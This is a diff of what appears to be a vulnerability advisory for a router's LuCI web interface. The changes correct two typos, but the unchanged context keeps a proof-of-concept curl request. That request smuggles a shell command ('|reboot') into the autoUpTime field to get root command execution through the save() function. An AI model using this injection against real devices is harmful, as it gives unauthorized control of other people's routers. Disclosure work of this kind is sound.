@@ -12,7 +12,7 @@
 
 - **Exploitation**
 
-    Remote command execution on the root shell by modifying  the contest in the http post request .
+    Remote command execution on the root shell by modifying the content in the http post request .
 
 - **Affected Components**
 
@@ -28,7 +28,7 @@ Affected function: save()
     curl -i -s -k -v -X'POST'  -e "http://192.168.2.1/cgi-bin/luci/;stok=xxx/xxx/xxx/xxx" -b "sysauth=4a2c4bdba5fb1273ce62759fd42dba42" --data-binary "mode=1&autoUpTime=02%3A05|reboot" 'http://192.168.2.1/cgi-bin/luci/;stok=xxx/admin/xxx/xxx/xxx'
     ```
 
-    In this http packet, we add the command we want to execute *'reboot'* to the packet contest.
+    In this http packet, we add the command we want to execute *'reboot'* to the packet content.
 
    ![auto_upgrade_web_code](fig/auto_upgrade_web_code.png)
 
